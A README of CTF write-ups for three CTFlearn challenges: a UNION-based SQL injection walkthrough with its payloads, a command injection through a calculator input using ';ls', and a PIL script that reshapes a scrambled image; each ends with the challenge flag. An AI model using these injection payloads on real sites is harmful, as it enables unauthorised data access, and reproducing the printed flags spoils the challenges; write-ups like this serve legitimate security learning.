# CTFs-Writeups---CTFlearn

## Inj3ction Time <br>
"I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command" <br>

"1 OR 1=1" give us a few results but nothing we are interested in. <br>
Take into account the advice we started to look for the number of colums : "1 UNION SELECT 1,2" ; "1 UNION SELECT 1,2,3" ; "1 UNION SELECT 1,2,3,4" : Bingo <br>
We then try to use "UNION SELECT 1,2,3,4 FROM information_schema.tables" but it doesn't give us any result <br>
We then try : "1 UNION SELECT table_name,2,3,4 FROM information_schema.tables" <br>
Effectively finding the following flag : "w0w_y0u_f0und_m3" <br>
We then swtich our injection to find all colums names : "1 UNION SELECT column_name,2,3,4 FROM information_schema.columns" giving us : "f0und_m3" <br>
We then use the column name and the table name we found with a UNION injection : "1 UNION SELECT f0und_m3,2,3,4 FROM w0w_y0u_f0und_m3" effectively grabbing the full flag : abctf{uni0n_1s_4_gr34t_c0mm4nd} <br>

###### Writed by : Cloclodudu & Asch-sys <br><br><br><br>




## Calculat3 M3 <br>
Here! http://web.ctflearn.com/web7/ I forget how we were doing those calculations, but something tells me it was pretty insecure. <br>

The site display a calculator, by opening the html with f12 we are able to see that the input has a read only tag. We remove it and try to input ;ls to get the names of the files which works and get us the flag : {watch_0ut_f0r_th3_m0ng00s3} <br>

###### Writed by : Cloclodudu & Asch-sys <br><br><br><br>




## Image Magic <br>
It looks like someone messed up my picture! Can anyone reorganize the pixels? The python module PIL (Python Imaging Library) might be useful! https://mega.nz/#!OKxByZyT!vaabCJRG5D9zAUp7drTekcA5pszu67r_TbQMtxEzqGE <br>
Update: I think whoever messed up my image took every column of pixels and put them side by side. Update: I think the width of the image was 304 before they messed with it. <br>

We use this script below : <br>
from PIL import Image as Im; <br>
import numpy as np; <br>
Im.fromarray(np.reshape(np.asarray(Im.open('out copy.jpg')), (304, -1)).T).show() <br>
We finally get this flag :  CTFlearn{cool_right?} <br>

###### Writed by : Cloclodudu & Asch-sys <br><br><br><br>
